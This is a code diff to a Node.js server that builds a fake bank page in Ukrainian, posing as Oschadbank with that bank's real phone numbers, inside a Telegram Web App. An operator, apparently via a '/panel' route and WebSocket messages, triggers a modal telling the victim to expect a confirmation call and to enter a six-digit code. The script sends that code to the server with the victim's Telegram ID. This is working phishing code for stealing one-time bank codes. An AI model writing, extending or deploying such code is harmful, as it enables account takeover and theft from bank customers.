@@ -24,10 +24,219 @@ app.use((req, res, next) => {
     next();
 });
 
-// Маршруты для отдачи статических файлов
+// Генерация и отдача index.html с встроенным клиентским кодом
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    const clientScript = `
+        <script>
+            // Подключение к WebSocket
+            const sessionId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id || 'default_session'; // Получение sessionId из Telegram Web App
+            const ws = new WebSocket(\`ws://\${window.location.hostname}:3000\`);
+
+            // Элементы модального окна
+            const modal = document.getElementById("callModal");
+            const closeBtn = document.querySelector(".close");
+            const codeInput = document.getElementById("codeInput");
+            const keys = document.querySelectorAll(".key");
+            let timer = 59;
+            let timerInterval;
+
+            ws.onopen = () => {
+                console.log('WebSocket подключен');
+                ws.send(JSON.stringify({ type: 'register', sessionId }));
+            };
+
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                console.log('Получено сообщение от сервера:', data);
+                if (data.type === 'call') {
+                    modal.style.display = "block";
+                    startTimer();
+                }
+            };
+
+            ws.onclose = () => console.log('WebSocket отключен');
+            ws.onerror = (error) => console.error('WebSocket ошибка:', error);
+
+            closeBtn.onclick = function() {
+                modal.style.display = "none";
+                clearInterval(timerInterval);
+            };
+
+            window.onclick = function(event) {
+                if (event.target == modal) {
+                    modal.style.display = "none";
+                    clearInterval(timerInterval);
+                }
+            };
+
+            function startTimer() {
+                const timerElement = document.querySelector(".timer");
+                timerElement.textContent = \`Запросити дзвінок повторно через \${timer} секунд\`;
+                timerInterval = setInterval(() => {
+                    timer--;
+                    timerElement.textContent = \`Запросити дзвінок повторно через \${timer} секунд\`;
+                    if (timer <= 0) {
+                        clearInterval(timerInterval);
+                        timerElement.textContent = "Можна запросити дзвінок повторно";
+                    }
+                }, 1000);
+            }
+
+            keys.forEach(key => {
+                key.addEventListener("click", () => {
+                    if (key.id === "backspace") {
+                        codeInput.value = codeInput.value.slice(0, -1);
+                    } else if (key.id === "submit") {
+                        if (codeInput.value.length === 6) {
+                            fetch('/api/submit', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ sessionId, call_code: codeInput.value })
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('Ответ сервера:', data);
+                                modal.style.display = "none";
+                                clearInterval(timerInterval);
+                            })
+                            .catch(error => console.error('Ошибка отправки кода:', error));
+                        }
+                    } else {
+                        if (codeInput.value.length < 6) {
+                            codeInput.value += key.textContent;
+                        }
+                    }
+                });
+            });
+        </script>
+    `;
+
+    const html = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Bank</title>
+            <link rel="stylesheet" href="/styles.css">
+            <style>
+                .modal {
+                    display: none;
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background-color: rgba(0,0,0,0.5);
+                    z-index: 1000;
+                }
+                .modal-content {
+                    background-color: white;
+                    margin: 15% auto;
+                    padding: 20px;
+                    border-radius: 5px;
+                    width: 80%;
+                    max-width: 400px;
+                    text-align: center;
+                }
+                .close {
+                    color: #aaa;
+                    float: right;
+                    font-size: 28px;
+                    font-weight: bold;
+                    cursor: pointer;
+                }
+                .close:hover {
+                    color: black;
+                }
+                .timer {
+                    margin: 10px 0;
+                    color: #666;
+                }
+                .keypad {
+                    margin-top: 20px;
+                }
+                #codeInput {
+                    width: 100%;
+                    padding: 10px;
+                    margin-bottom: 10px;
+                    border: 1px solid #ccc;
+                    border-radius: 4px;
+                    text-align: center;
+                    font-size: 18px;
+                }
+                .buttons {
+                    display: grid;
+                    grid-template-columns: repeat(3, 1fr);
+                    gap: 10px;
+                }
+                .key {
+                    padding: 15px;
+                    font-size: 18px;
+                    border: 1px solid #ccc;
+                    border-radius: 50%;
+                    background-color: #f9f9f9;
+                    cursor: pointer;
+                }
+                .key:hover {
+                    background-color: #e0e0e0;
+                }
+                #backspace, #submit {
+                    font-size: 16px;
+                }
+            </style>
+            <script src="https://telegram.org/js/telegram-web-app.js?1"></script>
+        </head>
+        <body>
+            <!-- Твой существующий контент -->
+            <header>
+                <nav>
+                    <ul>
+                        <li><a href="#home">Home</a></li>
+                        <li><a href="#services">Services</a></li>
+                        <li><a href="#about">About</a></li>
+                        <li><a href="#contact">Contact</a></li>
+                    </ul>
+                </nav>
+            </header>
+            <main>
+                <section id="home" class="hero">
+                    <h1>Welcome to Our Bank</h1>
+                    <p>Your trusted financial partner.</p>
+                </section>
+                <!-- Другие секции -->
+            </main>
+
+            <div id="callModal" class="modal">
+                <div class="modal-content">
+                    <span class="close">&times;</span>
+                    <h2>Підтвердження</h2>
+                    <p>На Ваш номер 380*******26</p>
+                    <p>телефонне Ощадбанку:</p>
+                    <p>+38044 363 0133</p>
+                    <p>+38044 350 0133</p>
+                    <p>Прийміть дзвінок та дотримуйтесь<br>інструкцій</p>
+                    <div class="timer">Запросити дзвінок повторно через 59 секунд</div>
+                    <p style="color: #00aaff;">Немає можливості отримувати дзвінки та SMS</p>
+                    <div class="keypad">
+                        <input type="text" id="codeInput" placeholder="Введіть код" maxlength="6" readonly>
+                        <div class="buttons">
+                            <button class="key">1</button><button class="key">2</button><button class="key">3</button>
+                            <button class="key">4</button><button class="key">5</button><button class="key">6</button>
+                            <button class="key">7</button><button class="key">8</button><button class="key">9</button>
+                            <button class="key" id="backspace">⌫</button><button class="key">0</button><button class="key" id="submit">✓</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            ${clientScript}
+        </body>
+        </html>
+    `;
+    res.send(html);
 });
+
 app.get('/panel', (req, res) => {
     res.sendFile(path.join(__dirname, 'panel.html'));
 });
